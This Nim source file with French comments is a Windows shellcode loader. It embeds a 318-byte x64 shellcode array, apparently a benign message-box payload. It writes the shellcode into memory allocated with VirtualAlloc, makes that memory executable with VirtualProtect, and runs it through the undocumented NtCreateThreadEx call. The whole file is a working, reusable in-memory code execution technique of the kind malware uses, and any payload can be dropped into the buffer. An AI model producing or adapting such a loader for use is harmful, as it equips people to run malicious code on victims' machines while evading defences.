import winim/lean

# Déclaration de NtCreateThreadEx depuis ntdll.dll
type
  PUSER_THREAD_START_ROUTINE* = proc(p: pointer): pointer {.stdcall.}

proc NtCreateThreadEx(
  ThreadHandle: ptr HANDLE,
  DesiredAccess: ACCESS_MASK,
  ObjectAttributes: pointer,
  ProcessHandle: HANDLE,
  StartRoutine: PUSER_THREAD_START_ROUTINE,
  Argument: pointer,
  CreateFlags: ULONG,
  ZeroBits: SIZE_T,
  StackSize: SIZE_T,
  MaximumStackSize: SIZE_T,
  AttributeList: pointer
): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}

proc main() =
  let buf: array[318, byte] = [byte 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00,
    0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x51, 0x56,
    0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31,
    0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
    0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48,
    0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78,
    0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x8b,
    0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x50, 0x49, 0x01, 0xd0, 0xe3, 0x56,
    0x4d, 0x31, 0xc9, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
    0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
    0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41,
    0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b,
    0x04, 0x88, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x48, 0x01, 0xd0, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52,
    0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff,
    0xff, 0xff, 0x5d, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x75, 0x73, 0x65, 0x72,
    0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x59, 0x41, 0xba, 0x4c, 0x77,
    0x26, 0x07, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0xe8,
    0x1a, 0x00, 0x00, 0x00, 0x54, 0x61, 0x73, 0x6b, 0x20, 0x66, 0x61, 0x69,
    0x6c, 0x65, 0x64, 0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66,
    0x75, 0x6c, 0x6c, 0x79, 0x21, 0x00, 0x5a, 0xe8, 0x07, 0x00, 0x00, 0x00,
    0x45, 0x72, 0x72, 0x6f, 0x72, 0x21, 0x00, 0x41, 0x58, 0x48, 0x31, 0xc9,
    0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41,
    0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5]
  
  # Allouer mémoire exécutable
  let mem = VirtualAlloc(nil, buf.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  
  # Copier le shellcode en mémoire
  copyMem(mem, unsafeAddr buf[0], buf.len)
  
  # Rendre la mémoire exécutable
  var oldProtect: DWORD
  discard VirtualProtect(mem, buf.len, PAGE_EXECUTE_READ, addr oldProtect)
  
  # Obtenir le handle du processus actuel
  let hProcess = GetCurrentProcess()
  var hThread: HANDLE
  
  # Créer un thread avec NtCreateThreadEx
  let status = NtCreateThreadEx(
    addr hThread,
    THREAD_ALL_ACCESS,
    nil,
    hProcess,
    cast[PUSER_THREAD_START_ROUTINE](mem),
    nil,
    0,
    0,
    0,
    0,
    nil
  )
  
  if status == 0:
    # Attendre que le thread se termine
    discard WaitForSingleObject(hThread, INFINITE)
    discard CloseHandle(hThread)

main()